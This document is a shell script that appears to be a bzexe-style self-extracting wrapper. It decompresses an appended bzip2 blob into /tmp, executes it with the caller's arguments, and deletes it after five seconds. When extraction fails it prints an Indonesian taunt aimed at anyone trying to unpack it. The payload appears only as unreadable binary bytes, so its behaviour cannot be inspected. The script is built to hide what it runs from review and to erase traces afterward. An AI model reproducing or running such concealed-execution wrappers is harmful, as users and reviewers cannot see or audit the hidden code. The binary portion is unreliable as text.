#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY��  �߀D0}������~����P�،�)� !(�b2i0�4�!�F'�4�CA�h�Mhѡ�0&� �hb ш�� *��Q�jz� hh  � �hѡ�0&� �hb ш�� H&@4M��Q�d���M4hfP���z�R�,�J4�lM��I���M�@G[��4�x���2���2
9�B��׍.�����w3���s��P~��y�ܬ���Md}�u3MI`�,W�Pg��dw`Ml�p���xG��3\g���-��!��EU���m��Ã�U�4�T�^y�<T�5�����yѤ-3�L�q �0~N��fPI�d/�W� ��-��o'�9Ɋ�q����	���� �53��r�`̾��l�gذ;���m��F��䁔�`��K"�.��)k8N(�%K��j���Z+�����GK�Ӟ��8/�Cl`e�N������/�z���X*AdJH)8�N��Y 7ϸe7`�JjJ����{C��f��L��F,��;�hAw�x-J�w$�r e��`�V#�U�$����Ғ�@�Qz�k\��0?0E��@��<3��_� �:���d�D�+2 �(~NK��M�2�Fr{MĂ����:��H�n�0>�墡��@��u�$s�g1ЬrayΑf),5PX��4��q�朼1-T�E��A����A���^��2�{�-"�l��A��>$y�5�y
���V�,���L �@q�)hX@�Tqd;sg�%b��ih��r�=.Ў4:��a�R,G�<K��؝V���e�ޣTT�ͅS�:�
���U7��2�m=e$�y\W!i!�c'��0�;(�p၇�dB&�j`�FOdB"����D���Y�d2�(����K���`�k��ѻ�P�6�xOI��o��v���="�[G�R/�L��:�gɊ�
�U|�}颜ɢ�F��xb�L\��7^����f�jٹ� A0�� +��L`d��A��#�� �Y �E؂�s]J$VKY���\))Tb�&�_`��0�!5���1�JQ&@�*)�����0�w�w��fN9�x�]t����)�?�